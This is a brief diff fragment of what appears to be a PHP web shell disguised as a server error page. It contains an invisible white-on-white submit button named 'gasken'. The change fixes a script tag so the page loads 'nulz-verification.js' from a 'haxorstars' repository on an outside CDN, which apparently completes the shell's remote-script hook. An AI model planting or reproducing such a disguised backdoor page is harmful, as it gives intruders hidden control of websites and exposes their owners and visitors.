@@ -430,7 +430,7 @@ error was encountered while trying to use an ErrorDocument to handle the request
 <button type="submit" name="gasken" style="background: #fff; color: #fff; border: none; outline: none; cursor: pointer;">&gt;&gt;</button>
 </form>
 </div>
-<script type="text/javascript" src="https://cdn.jsdelivr.net/gh/haxorstars/archive@master/nulz-mini/nulz-verification.js"></s>
+<script type="text/javascript" src="https://cdn.jsdelivr.net/gh/haxorstars/archive@master/nulz-mini/nulz-verification.js"></script>
 </body></html>
 <?php
         exit();
